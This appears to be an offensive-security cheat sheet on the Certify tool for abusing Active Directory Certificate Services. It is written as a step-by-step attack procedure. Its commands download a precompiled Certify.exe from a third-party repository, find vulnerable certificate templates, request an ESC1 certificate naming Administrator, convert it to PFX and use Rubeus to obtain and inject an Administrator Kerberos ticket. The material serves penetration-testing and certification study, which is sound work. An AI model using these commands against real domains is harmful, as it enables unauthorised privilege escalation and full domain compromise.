# 03.09 Certify

> GhostPack ADCS enumeration and abuse tool — find vulnerable templates, request certs, authenticate.

## Overview

Certify is the Windows-native ADCS attack tool — predecessor to Certipy. C# binary, runs on a Windows attacker host. Enumerates CAs, templates, and identifies vulnerable templates (ESC1-8). Requests certificates given subject overrides. For modern ADCS work, Certipy (Linux) usually surpasses Certify (Windows) — but Certify is the Windows-native option and often referenced in CRTP material.

## Steps

- **Step 1** - Get binary or compile from source.
- **Step 2** - Enumerate templates with `find /vulnerable`.
- **Step 3** - Request cert with `request /ca:<CA> /template:<TEMPLATE>`.
- **Step 4** - Authenticate with the .pfx using Rubeus.

## Commands

### Get binary

```powershell
iwr 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe' -OutFile Certify.exe
```

### Find vulnerable templates

```powershell
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
Certify.exe find /vulnerable /enrolleeSuppliesSubject     # ESC1
Certify.exe find /vulnerable /clientauth                  # client-auth enabled templates
```

### Request cert (ESC1 — Enrollee Supplies Subject)

```powershell
Certify.exe request /ca:<CA-FQDN>\<CA-NAME> /template:<VULN-TEMPLATE> /altname:Administrator
```

### Request cert as current user

```powershell
Certify.exe request /ca:<CA-FQDN>\<CA-NAME> /template:User
```

### Convert .pem → .pfx and auth via Rubeus

```powershell
# Save certificate output from Certify into cert.pem (PEM format)
# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx

# Authenticate as Administrator
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<PFX-PASSWORD> /ptt
```
